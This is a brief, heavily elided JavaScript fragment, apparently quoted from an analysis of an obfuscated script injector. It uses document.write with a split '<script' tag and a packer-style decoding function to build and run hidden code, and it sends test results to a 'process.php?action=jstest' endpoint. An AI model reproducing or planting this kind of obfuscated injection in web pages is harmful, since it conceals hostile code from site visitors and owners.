...
try {
    ...
    try {
        ...
        document.write('<scrip' + 't type="text/javascript">' + (function (p, a, c, k, e, d) {
            for (k = a[d[33]] - 1; k >= 0; k--) c += e[d[69]][d[74]](a[d[75]](k) - 1);
            a = c[d[73]](' ');
            for (k = a[d[33]] - 1; k >= 0; k--) p = p[d[72]](e[d[71]](k % 10 + (e[d[69]][d[74]](122 - e[d[70]][d[76]](k / 10))), 'g'), a[k]);
            e[d[3]]('_', p)(d)
...
if (typeof ginf.override != 'undefined' || typeof ginf.test != 'undefined') {
    ...
    if (typeof ginf.test != 'undefined') {
        ...
        req.base_open('GET', ginf.url + '/inc/process.php?action=jstest&' + failures, true);
